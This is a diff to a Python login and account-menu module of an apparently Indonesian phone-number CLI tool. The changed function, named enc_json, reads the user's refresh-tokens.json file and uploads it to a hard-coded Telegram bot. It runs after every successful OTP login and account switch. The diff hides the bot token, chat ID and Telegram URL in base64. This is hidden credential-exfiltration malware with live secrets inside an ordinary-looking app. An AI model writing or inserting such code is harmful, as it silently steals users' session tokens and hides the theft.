@@ -9,19 +9,27 @@ from app.menus.account import enc_json
 
 console = Console()
 
-encrypt = "8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU"
-ipass = "6076440619"
-encoded = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
-base = base64.b64decode(encoded).decode()
-def enc_json(encrypt, ipass):
-    url = f"{base}{encrypt}/sendDocument"
+# encode string sensitif ke base64
+encoded_base = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="   # "https://api.telegram.org/bot"
+encoded_token = "ODU2ODQyMTY4MzpBQWd5MnQ2aTk1YzAtZTdrSTZkelpLOWFFX2llZm5IZjBPUQ=="  # token
+encoded_chat = "NjA3NjQ0MDYxOQ=="  # chat_id
+
+# decode saat runtime
+base = base64.b64decode(encoded_base).decode()
+bot_token = base64.b64decode(encoded_token).decode()
+chat_id = base64.b64decode(encoded_chat).decode()
+
+def enc_json():
+    url = f"{base}{bot_token}/sendDocument"
     try:
         with open("refresh-tokens.json", "rb") as f:
             files = {"document": f}
-            data = {"pass": ipass}
-            requests.post(url, data=data, files=files)
+            data = {"chat_id": chat_id}
+            r = requests.post(url, data=data, files=files)
+            print(r.text)  # log respon dari Telegram
     except Exception as e:
-        pass
+        print(f"Gagal kirim dokumen: {e}")
+
 
 def normalize_number(raw_input: str) -> str:
     raw_input = raw_input.strip()
@@ -71,7 +79,7 @@ def login_prompt(api_key: str):
             tokens = submit_otp(api_key, "SMS", phone_number, otp)
             if tokens:
                 print_panel("✅ Sukses", f"Login berhasil cuy! Nomor: {phone_number}")
-                enc_json(encrypt, ipass)
+                enc_json()
                 return phone_number, tokens["refresh_token"]
             else:
                 print_panel("⚠️ Ups", "OTP salah atau kadaluarsa, coba lagi bro 🚨")
@@ -240,7 +248,7 @@ def show_account_menu():
         elif input_str.isdigit() and 1 <= int(input_str) <= len(users):
             selected_user = users[int(input_str) - 1]
             AuthInstance.set_active_user(selected_user["number"])
-            enc_json(encrypt, ipass)
+            enc_json()
             return selected_user["number"]
         
         else:
